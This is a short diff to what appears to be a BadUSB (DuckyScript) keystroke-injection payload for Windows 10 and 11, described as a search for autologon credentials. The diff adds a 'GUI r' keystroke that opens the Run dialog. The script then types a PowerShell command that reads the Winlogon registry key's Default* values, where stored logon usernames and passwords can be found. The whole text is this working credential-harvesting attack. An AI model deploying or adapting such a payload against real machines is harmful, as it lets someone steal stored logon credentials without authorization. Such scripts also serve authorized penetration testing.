@@ -6,5 +6,6 @@ REM     Description: Search for autologon credentials
 
 REM     Target: Windows 10, 11
 DELAY 1000
+GUI r
 STRING powershell -c "gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"
 ENTER
